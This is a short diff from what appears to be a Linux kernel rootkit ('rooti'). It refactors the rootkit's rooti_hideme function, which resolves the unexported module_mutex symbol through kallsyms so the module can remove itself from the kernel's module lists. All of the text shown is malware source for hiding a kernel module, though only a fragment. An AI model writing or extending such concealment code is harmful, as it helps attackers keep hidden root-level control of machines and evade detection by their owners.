@@ -31,12 +31,7 @@ static void rooti_hideme_from_sysfs(void)
 */
 int rooti_hideme()
 {
-    // The mutex protecting the list of modules is not an exported symbol
-    struct mutex *__module_mutex = (struct mutex *)__kallsyms_lookup_name("module_mutex");
-    if (__module_mutex == NULL) {
-        ROOTI_DEBUG("unresolved symbol: 'module_mutex'");
-        return -EFAULT;
-    }
+    ROOTI_RESOLVE_SYM_ADDR(struct mutex *, module_mutex, -ENOENT);
 
     // Remove info about this module from various data structures
     mutex_lock(__module_mutex);
